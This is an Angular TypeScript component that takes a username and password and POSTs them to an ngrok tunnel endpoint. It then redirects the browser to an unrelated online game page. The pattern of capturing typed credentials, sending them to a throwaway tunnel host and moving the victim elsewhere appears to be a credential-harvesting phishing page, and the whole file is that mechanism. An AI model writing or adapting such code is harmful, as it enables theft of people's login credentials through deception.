import { HttpClient } from '@angular/common/http';
import { Component } from '@angular/core';

@Component({
  selector: 'app-root',
  templateUrl: './app.component.html',
  styleUrls: ['./app.component.css']
})
export class AppComponent {
  username = '';
  password = ''
  constructor(private http:HttpClient){}

  submit(){
    this.http.post('https://c48e-2a02-1811-c485-4d00-3d26-5d9-575-12cf.ngrok.io/auth/user',
     {username: this.username, password: this.password})
     .subscribe((res)=>{
      this.username = '';
      this.password = ''
      window.location.href = 'https://www.crazygames.com/game/ludo-king'
     })
  }
}
